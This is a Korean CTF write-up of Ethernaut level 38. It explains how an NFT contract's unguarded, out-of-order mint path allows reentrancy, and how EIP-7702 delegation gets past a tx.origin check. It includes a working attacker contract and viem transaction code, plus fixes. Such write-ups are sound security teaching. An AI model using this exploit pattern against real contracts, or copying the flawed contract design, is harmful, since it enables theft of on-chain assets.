# Ethernaut Level 38 - UniqueNFT

## 문제 설명

주소당 NFT 1개만 mint할 수 있도록 설계된 ERC721 컨트랙트이다.
**같은 주소에서 NFT를 2개 이상 보유**하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract UniqueNFT is ERC721 {
    uint256 public tokenId;

    // EOA는 무료로 mint
    function mintNFTEOA() external returns (uint256) {
        require(tx.origin == msg.sender, "not an EOA");  // EOA 검증
        return _mintNFT();
    }

    // 컨트랙트는 1 ETH 지불 후 mint (nonReentrant 적용)
    function mintNFTContract() external payable nonReentrant returns (uint256) {
        require(msg.value == 1 ether, "wrong value");
        return _mintNFT();
    }

    function _mintNFT() internal returns (uint256) {
        require(balanceOf(msg.sender) == 0, "only one unique NFT allowed");  // 1개 제한

        uint256 _tokenId = ++tokenId;

        // ❌ CEI 패턴 위반!
        // 1. Check: balanceOf == 0 ✅
        // 2. Interaction: 외부 호출 (onERC721Received)  ← 여기서 재진입 가능!
        // 3. Effects: _mint로 상태 업데이트
        ERC721Utils.checkOnERC721Received(address(0), address(0), msg.sender, _tokenId, "");
        _mint(msg.sender, _tokenId);  // ← 외부 호출 이후 상태 변경

        return _tokenId;
    }
}
```

---

## 취약점 분석

### 1. CEI 패턴 위반 (Checks-Effects-Interactions)

```
올바른 순서: Check → Effects → Interactions
취약한 순서: Check → Interactions → Effects  ← 이 컨트랙트
```

`_mintNFT()` 내부에서 `checkOnERC721Received()`가 `_mint()` **보다 먼저** 호출된다.

→ 외부 호출(`onERC721Received`) 시점에 아직 `balanceOf == 0` 상태
→ 이 창을 이용해 재진입 시 두 번째 mint 가능

### 2. EOA 경로에 ReentrancyGuard 미적용

```solidity
// ✅ 컨트랙트 경로: nonReentrant 적용
function mintNFTContract() external payable nonReentrant { ... }

// ❌ EOA 경로: 재진입 방어 없음
function mintNFTEOA() external { ... }
```

`mintNFTEOA`에는 `nonReentrant`가 없어 재진입이 완전히 열려 있다.

### 3. tx.origin == msg.sender 검증의 한계

```solidity
require(tx.origin == msg.sender, "not an EOA");
```

**EIP-7702** 환경에서는 EOA가 컨트랙트 코드를 위임받아 실행할 수 있다.
이 경우 `tx.origin`은 EOA, `msg.sender`도 EOA이지만
실제로는 컨트랙트 코드(`ReentrancyAttacker`)가 동작한다.

→ EOA 검증 통과 + 컨트랙트 로직 실행 = 두 가지를 동시에 충족

### 4. 공격 흐름 요약

```
1. EOA가 EIP-7702로 ReentrancyAttacker에 delegation 설정
2. EOA → UniqueNFT.mintNFTEOA() 호출
   (tx.origin == msg.sender 통과 ✅, balanceOf == 0 통과 ✅)
3. _mintNFT() 내부에서 checkOnERC721Received() 실행
   → ReentrancyAttacker.onERC721Received() 콜백 호출
4. onERC721Received() 안에서 mintNFTEOA() 재진입!
   (아직 _mint 실행 전 → balanceOf 여전히 0 ✅)
5. 두 번째 NFT mint 완료
6. 첫 번째 _mint 실행 완료
7. 결과: 같은 주소에 NFT 2개
```

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniqueNFT {
    function mintNFTEOA() external returns (uint256);
}

contract ReentrancyAttacker is IERC721Receiver {
    IUniqueNFT public immutable target;
    uint256 public entered;

    constructor(address _target) {
        target = IUniqueNFT(_target);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        entered += 1;

        if (entered == 1) {
            // 첫 번째 콜백에서만 재진입 (무한루프 방지)
            target.mintNFTEOA();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
```

---

## 공격 단계

### Step 1 — ReentrancyAttacker 배포

```
_target : UniqueNFT 인스턴스 주소
```

### Step 2 — EIP-7702 Authorization 서명 (viem)

```typescript
import { createWalletClient, http, encodeFunctionData } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { sepolia } from "viem/chains";

const PRIVATE_KEY = "0x...";         // 내 개인키
const IMPLEMENTATION = "0x...";      // ReentrancyAttacker 주소
const UNIQUE_NFT = "0x...";          // UniqueNFT 인스턴스 주소

const account = privateKeyToAccount(PRIVATE_KEY);
const walletClient = createWalletClient({
    account,
    chain: sepolia,
    transport: http(RPC_URL),
});

// EIP-7702: EOA → ReentrancyAttacker 위임 서명
const authorization = await walletClient.signAuthorization({
    account,
    contractAddress: IMPLEMENTATION,
    executor: 'self',
});
```

### Step 3 — mintNFTEOA 트랜잭션 전송 (EIP-7702 type 4)

```typescript
const abi = [{
    inputs: [],
    name: 'mintNFTEOA',
    outputs: [{ type: 'uint256' }],
    type: 'function'
}];

const data = encodeFunctionData({
    abi,
    functionName: 'mintNFTEOA',
    args: []
});

// type 4 트랜잭션 (EIP-7702) + authorizationList 첨부
const txHash = await walletClient.sendTransaction({
    to: UNIQUE_NFT,
    data,
    authorizationList: [authorization],
});

console.log("tx:", txHash);
```

### Step 4 — 결과 확인

```js
// 같은 주소에 NFT 2개 보유 확인
await contract.balanceOf(player)
// → 2

await contract.ownerOf(1)
// → player 주소

await contract.ownerOf(2)
// → player 주소
```

---

## 콜 트레이스

```
call #1: EOA → UniqueNFT.mintNFTEOA()
           ↓ (EIP-7702 위임 실행)
           balanceOf(EOA) == 0 ✅
           checkOnERC721Received() 호출
               ↓
call #2:   UniqueNFT → ReentrancyAttacker.onERC721Received()
               ↓ (entered == 1, 재진입)
call #3:       ReentrancyAttacker → UniqueNFT.mintNFTEOA()
                   balanceOf(EOA) == 0 ✅ (아직 _mint 안됨)
                   checkOnERC721Received() 호출
                       ↓
                   onERC721Received() (entered == 2, 종료)
                   _mint(EOA, tokenId=2) ← NFT #2 mint
               ← call #3 완료
           ← call #2 완료
           _mint(EOA, tokenId=1) ← NFT #1 mint
← call #1 완료

결과: EOA가 tokenId 1, 2 모두 보유
```

---

## 핵심 교훈

### 1. CEI 패턴 철저 준수

```solidity
// ❌ 위험 - Interaction 후 Effects
ERC721Utils.checkOnERC721Received(...);  // 외부 호출 먼저
_mint(msg.sender, _tokenId);             // 상태 변경 나중

// ✅ 안전 - Effects 후 Interaction
_mint(msg.sender, _tokenId);             // 상태 변경 먼저
ERC721Utils.checkOnERC721Received(...);  // 외부 호출 나중
```

### 2. 모든 외부 진입점에 일관된 ReentrancyGuard 적용

```solidity
// ❌ 위험 - EOA 경로에 가드 없음
function mintNFTEOA() external { ... }

// ✅ 안전 - 모든 경로에 nonReentrant 적용
function mintNFTEOA() external nonReentrant { ... }
```

### 3. EIP-7702 환경에서 tx.origin 검증의 한계

```solidity
// ❌ 불충분 - EIP-7702로 우회 가능
require(tx.origin == msg.sender, "not an EOA");

// ✅ 추가 검증 - extcodesize 확인
require(tx.origin == msg.sender, "not an EOA");
require(msg.sender.code.length == 0, "contract detected");
// 단, EIP-7702 delegation도 code.length > 0 이므로 방어 가능
```

### 4. EIP-7702의 보안 위협 모델 이해

EIP-7702는 EOA가 컨트랙트 코드를 임시 위임받아 실행할 수 있게 한다.
`tx.origin == msg.sender` 같은 전통적인 EOA 검증은 이 환경에서 **신뢰할 수 없다**.
새로운 스마트 컨트랙트 감사 시 EIP-7702 위협 모델을 반드시 포함해야 한다.
